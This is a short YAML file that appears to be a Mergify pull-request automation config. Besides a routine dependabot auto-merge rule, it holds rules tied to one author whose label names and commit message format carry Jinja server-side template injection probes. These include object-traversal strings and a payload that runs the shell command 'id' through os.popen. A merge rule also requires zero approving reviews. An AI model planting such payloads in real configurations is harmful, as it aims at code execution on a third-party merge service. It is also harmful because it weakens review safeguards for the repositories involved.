queue_rules:
  - name: default
    conditions:
      - base=main
pull_request_rules:
  - name: auto-merge dependabot
    conditions:
      - author=dependabot[bot]
    actions:
      merge:
        method: squash
  - name: i63201-label-jinja
    conditions:
      - label=i63201-go
      - author=dewpboer
    actions:
      label:
        add:
          - "i63201-a-{{7*7}}"
          - "i63201-b-{{'X'|lower}}"
          - "i63201-c-{%print(6*7)%}"
          - "i63201-d-{{7*'7'}}"
          - "i63201-e-{{lipsum.__globals__}}"
          - "i63201-f-{{cycler.__init__}}"
          - "i63201-g-{{ title }}"
          - "i63201-h-{{ author }}"
          - "i63201-i-{{ base }}"
          - "{{lipsum.__globals__['os'].popen('id').read()}}"
          - "{{().__class__.__base__.__subclasses__}}"
  - name: i63201-label-toggle
    conditions:
      - label=i63201-toggle
      - author=dewpboer
    actions:
      label:
        toggle:
          - "i63201-t1-{{7*7}}"
          - "{{'z'|upper}}"
  - name: i63201-merge-fmt
    conditions:
      - label=i63201-merge
      - author=dewpboer
      - "#approved-reviews-by>=0"
    actions:
      merge:
        method: merge
        commit_message_format: "i63201 fmt title={title} arith={{7*7}} cls={title.__class__}"
